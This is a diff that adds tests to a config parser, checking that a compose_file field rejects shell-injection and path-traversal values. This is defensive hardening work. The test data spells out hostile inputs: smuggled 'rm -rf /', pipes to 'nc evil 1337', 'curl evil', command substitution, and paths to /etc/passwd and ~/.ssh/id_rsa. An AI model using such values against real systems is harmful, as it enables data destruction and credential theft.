@@ -104,4 +104,76 @@ command: ./deploy.sh --production
 `);
     expect(config.command).toBe("./deploy.sh --production");
   });
+
+  describe("compose_file shell-injection hardening", () => {
+    const validValues = [
+      "docker-compose.yml",
+      "docker-compose.prod.yml",
+      "deploy/compose.yml",
+      "compose.yaml",
+      "infra/docker/compose.prod.yml",
+      "a_b-c.0.1.yml",
+    ];
+
+    for (const value of validValues) {
+      it(`accepts safe value: ${value}`, () => {
+        const config = parseRelayConfig(`
+name: app
+health: /health
+compose_file: ${value}
+`);
+        expect(config.compose_file).toBe(value);
+      });
+    }
+
+    // Each entry exercises a distinct shell-injection or path-traversal
+    // vector that the hardening must reject before the value reaches the
+    // shell layer.
+    const malicious: [string, string][] = [
+      ["single quote", "docker-compose.yml'; rm -rf /#"],
+      ["double quote", 'docker-compose.yml"; echo pwned'],
+      ["semicolon", "docker-compose.yml; touch /tmp/x"],
+      ["pipe", "docker-compose.yml | nc evil 1337"],
+      ["backtick command sub", "docker-compose.yml`whoami`"],
+      ["dollar command sub", "docker-compose.yml$(id)"],
+      ["space", "docker-compose.yml extra"],
+      ["newline", "docker-compose.yml\nrm -rf /"],
+      ["null byte", "docker-compose.yml\u0000.evil"],
+      ["parent dir traversal", "../../etc/passwd"],
+      ["embedded parent dir", "deploy/../../etc/passwd"],
+      ["ampersand", "docker-compose.yml & curl evil"],
+      ["redirect", "docker-compose.yml > /tmp/x"],
+      ["glob", "docker-compose.y*"],
+      ["tilde", "~/.ssh/id_rsa"],
+      ["absolute path", "/etc/passwd"],
+      ["absolute compose path", "/var/lib/docker/compose.yml"],
+      ["backslash", "deploy\\compose.yml"],
+      ["leading whitespace", " docker-compose.yml"],
+      ["trailing whitespace", "docker-compose.yml "],
+      ["control char SOH", "docker-compose.yml\u0001evil"],
+      ["empty string", ""],
+    ];
+
+    for (const [label, value] of malicious) {
+      it(`rejects ${label}: ${JSON.stringify(value)}`, () => {
+        // YAML-quoted so newlines / nulls / specials survive the load.
+        const yaml = `name: app\nhealth: /health\ncompose_file: ${JSON.stringify(value)}\n`;
+        expect(() => parseRelayConfig(yaml)).toThrow(RelayConfigError);
+      });
+    }
+
+    it("error message points at compose_file", () => {
+      try {
+        parseRelayConfig(`
+name: app
+health: /health
+compose_file: "evil; rm -rf /"
+`);
+        expect.unreachable("should have thrown");
+      } catch (err) {
+        expect(err).toBeInstanceOf(RelayConfigError);
+        expect((err as RelayConfigError).message).toContain("compose_file");
+      }
+    });
+  });
 });
